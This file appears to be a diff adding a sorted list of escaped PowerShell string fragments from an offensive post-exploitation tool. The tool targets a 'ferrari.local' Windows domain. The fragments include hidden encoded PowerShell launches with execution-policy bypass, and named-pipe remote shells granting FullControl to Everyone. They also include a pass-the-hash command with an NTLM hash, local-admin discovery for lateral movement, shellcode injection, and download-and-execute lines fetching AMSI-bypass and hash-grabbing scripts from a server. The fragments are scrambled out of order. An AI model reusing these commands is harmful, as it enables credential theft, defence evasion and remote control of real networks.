@@ -1,0 +1,239 @@
+"`"" -Command "
+"`"" -Domain "
+"`"" -Password "
+"`"" exitfunc=thread -b "
+"`"" | Set-WmiInstance -Arguments "
+"`"""
+"`"""", """
+"`""#Amn3siacP@ssw0rd!#"
+"`""#END#"
+"`""$Command"
+"`""$KeyID = '$GuidOutput'"
+"`""$RawClientScript"
+"`""$RawServerScript"
+"`""$SID"
+"`""$ShCodePlaceholder"
+"`""$Target"
+"`""$arguments"
+"`""$finalstring"
+"`""$pipeName"
+"`""$startarguments"
+"`""); "
+"`"");"
+"`""){break}else{try{"
+"`"", "
+"`"", 'InOut'); "
+"`"","
+"`""-NoP"
+"`""-enc $b64ServerScript"
+"`""-enc $b64ServerScriptEdit"
+"`""-ep Bypass"
+"`""."
+"`"".\Administrator"
+"`"";"
+"`""Administrator"
+"`""Allow"
+"`""C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript"
+"`""C:\Windows\System32\cmd.exe /c powershell.exe -enc $b64ClientScript"
+"`""C:\Windows\System32\cmd.exe /c powershell.exe -enc $b64ServerScript"
+"`""DC01.ferrari.local,Server2012.ferrari.local"
+"`""FullControl"
+"`""P@ssw0rd!"
+"`""S-1-1-0"
+"`""Workstation-01.ferrari.local,DC01.ferrari.local"
+"`""\x00"
+"`""c:\Users\Public\Documents\"
+"`""comma_separated_Targets"
+"`""dummyhostdropconnection,"
+"`""exit"
+"`""ferrari.local"
+"`""ferrari\Administrator"
+"`""powershell.exe -ep bypass -WindowS Hidden -enc JABzAGQA.....wBlACgAKQA="
+"`""sekurlsa::pth /user:Administrator /domain:ferrari.local /ntlm:217E50203A5ABA59CEFA863C724BF61B"
+"`""whoami /all"
+"`""|%{"
+"`$(Get-Location),"
+"`$(whoami)"""");"
+"`$_.Exception.Message-split """""
+"`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);"
+"`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg("
+"`$c 2>&1 | Out-String"""";"
+"`$c-eq """"exit""""){break};try{"
+"`$cmd 2>&1 | Out-String"""";"
+"`$cmd-eq""""exit""""){break}else{try{"
+"`$cred = New-Object System.Management.Automation.PSCredential($userdefusername,"
+"`$env:COMPUTERNAME,"
+"`$env:computerName)).HostName),"
+"`$err-split"""""
+"`$errorMessage -split """
+"`$p=New-Object System.IO.Pipes.NamedPipeClientStream(""""$ComputerName"""",""""$PipeName"""",'InOut');"
+"`$p=New-Object System.IO.Pipes.NamedPipeClientStream('$ComputerName','$PipeName','InOut');"
+"`$pS=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,"
+"`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream(""$PipeName"", 'InOut', 1, 'Byte', 'None', 4096, 4096, "
+"`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream('$PN', 'InOut', 1, 'Byte', 'None', 1028, 1028, "
+"`$process = Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-ep Bypass', '-enc $encCommand' -PassThru;"
+"`$ps, 600000, [System.Threading.Timeout]::Infinite);"
+"`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,"
+"`$res -split """""
+"`$res=iex """""
+"`$result -split """
+"`$result = Invoke-Expression """
+"`$result-split """""
+"`$result=iex """""
+"`$sU,""""FullControl"""",""""Allow"""");"
+"`$sU=New-Object System.Security.Principal.SecurityIdentifier """"$SID"""";"
+"`$sU=New-Object System.Security.Principal.SecurityIdentifier """"S-1-1-0"""";"
+"`$stoparguments = ""\\"
+"`$sw.WriteLine("""
+"`$sw.WriteLine(""""#END#"""");"
+"`$tcb, "
+"`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);"
+"`$user,"
+"`$w.WriteLine("""""
+"`$w.WriteLine(""""#END#"""");"
+"`n"" | ForEach-Object {"
+"`u{000A}"""" | % {"
+"`u{000A}""""|ForEach-Object{"
+`$(
+`$(Get-Location)
+`$([System.Net.Dns]::GetHostByName((
+`$?){del 'tmpfile';iex(new-object net.webclient).downloadstring('$($global:ServerURL)/SimpleAMSI.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/NETAMSI.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Ferrari.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-GrabTheHash.ps1');
+`$Find -split [Environment]::NewLine | Where-Object { 
+`$Find = @();
+`$Find = Access_Check -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc -Targets $userdeftargets;
+`$Find = Access_Check -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc;
+`$Find = Access_Check -Method PSRemoting -Domain $userdefdomain -Targets $userdeftargets;
+`$Find = Access_Check -Method PSRemoting -Domain $userdefdomain;
+`$Find = Access_Check -Method PSRemoting -Targets $userdeftargets;
+`$Find = Access_Check -Method PSRemoting;
+`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword;
+`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc -Targets $userdeftargets;
+`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc -UserName $userdefusername -Password $userdefpassword;
+`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc;
+`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword;
+`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -Targets $userdeftargets;
+`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -UserName $userdefusername -Password $userdefpassword;
+`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain;
+`$Find = Find-LocalAdminAccess -Method PSRemoting -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword;
+`$Find = Find-LocalAdminAccess -Method PSRemoting -Targets $userdeftargets;
+`$Find = Find-LocalAdminAccess -Method PSRemoting -UserName $userdefusername -Password $userdefpassword;
+`$Find = Find-LocalAdminAccess -Method PSRemoting;
+`$Find;
+`$Find;Invoke-Command -ComputerName 
+`$HashGrab = Invoke-GrabTheHash | Where-Object{
+`$HashGrab){
+`$SecPassword = ConvertTo-SecureString $userdefpassword -AsPlainText -Force;
+`$SecPassword);Invoke-Command -ComputerName 
+`$ShCodePlaceholder = 
+`$ShCodePlaceholder.Trim();PInject /t:1 /f:hex /pid:$InjectPID /sc:
+`$TargetServer delete 
+`$_ -match 'NTLM hash'};if(
+`$_)}};
+`$_.Exception.Message-split '
+`$_.Exception.Message;
+`$_.Id -eq 
+`$_.TrimEnd())}}catch{
+`$_.contains('.') };
+`$_.contains('.') };if(
+`$a.ClosE();
+`$aR);
+`$aR=New-Object System.IO.Pipes.PipeAccessRule(
+`$accessRule = New-Object System.IO.Pipes.PipeAccessRule(
+`$ar);
+`$ar=New-Object System.IO.Pipes.PipeAccessRule(
+`$b.COpYTo(
+`$b.ClOse();
+`$b=New-Object IO.Compression.GzipStream(
+`$c 2>&1|Out-String
+`$c);
+`$c-eq
+`$c-eq 'exit'){break};try{
+`$c.ToArray());
+`$c.cLose();
+`$c=
+`$c=New-Object System.IO.MemoryStream;
+`$cmd=
+`$command = 
+`$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob -Credential 
+`$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob > 
+`$computersLine = 
+`$computersLine =@();
+`$computersLine){
+`$cred > 
+`$d=[System.Text.Encoding]::UTF8.GETSTrIng(
+`$dummyPipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(
+`$dummyPipeClient); 
+`$dummyPipeClient.Connect(); 
+`$d|IEX > 
+`$e-split
+`$e=
+`$env:USERNAME)log.txt
+`$err=
+`$errorMessage = 
+`$gz));
+`$gz=
+`$job = Invoke-Command -ComputerName 
+`$job | Wait-Job;
+`$null
+`$null; if(
+`$outputData = &$commandStr | Out-String; Get-WmiObject -Class $ClassID -Filter 
+`$p);
+`$p.Close();
+`$p.Connect(600000);
+`$pS);
+`$pS);while(
+`$pS.Disconnect();
+`$pS.IsConnected){break};
+`$process = Get-Process | Where-Object { 
+`$process = Start-Process -FilePath 'C:\Users\Public\Documents\RDPLog.exe' -PassThru;
+`$processId = 
+`$ps);
+`$ps);while(
+`$ps.Disconnect();
+`$ps.IsConnected){break};
+`$ps.WaitForConnection();
+`$pwd\$remotefileName
+`$r-split
+`$r.ReadLine();if(
+`$r=New-Object System.IO.StreamReader(
+`$r=iex 
+`$result = Invoke-Expression 
+`$result-split '
+`$sD);
+`$sD.AddAccessRule(
+`$sD=New-Object System.IO.Pipes.PipeSecurity;
+`$sd);
+`$sd.AddAccessRule(
+`$sd=New-Object System.IO.Pipes.PipeSecurity;
+`$securityDescriptor.AddAccessRule(
+`$sr = New-Object System.IO.StreamReader(
+`$sr.ReadLine();if(
+`$sr=New-Object System.IO.StreamReader(
+`$state);
+`$state.Close()};
+`$sw = New-Object System.IO.StreamWriter(
+`$sw.Flush(); 
+`$sw.Flush()}};
+`$sw.WriteLine(
+`$sw=New-Object System.IO.StreamWriter(
+`$tcb={param(
+`$tm = New-Object System.Threading.Timer(
+`$tm.Dispose();
+`$trimmedShCodePlaceholder = 
+`$true){
+`$true){Start-Sleep -Milliseconds 100;if(-not 
+`$true){if(-not 
+`$user=New-Object System.Security.Principal.SecurityIdentifier 
+`$w.Flush();while(
+`$w.Flush()}
+`$w.WriteLine(
+`$w.WriteLine('#END#');
+`$w=New-Object System.IO.StreamWriter(
+`'$gzipcompressedBase64
+`';
+`@{OutputData = 
+`\
+`n
+`n'|%{
+`r?
+`u{000D}
